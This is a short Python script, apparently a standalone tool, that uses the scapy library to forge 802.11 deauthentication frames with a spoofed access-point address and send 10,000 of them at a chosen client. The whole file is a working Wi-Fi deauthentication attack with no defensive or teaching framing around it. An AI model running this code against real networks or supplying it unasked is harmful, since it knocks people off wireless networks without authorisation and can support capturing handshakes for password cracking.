from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
from scapy.all import *

def deauth(interface ,gateway_mac, target_mac):
	
    #MAC destination, MAC source, MAC Access Point
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

    # stack all layers
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    print("start sending deauth packets with gateway_mac: %s to target_mac: %s" %(gateway_mac, target_mac))
    # send deauth packet
    sendp(packet, inter=0.1, count=10000, iface=interface, verbose=1)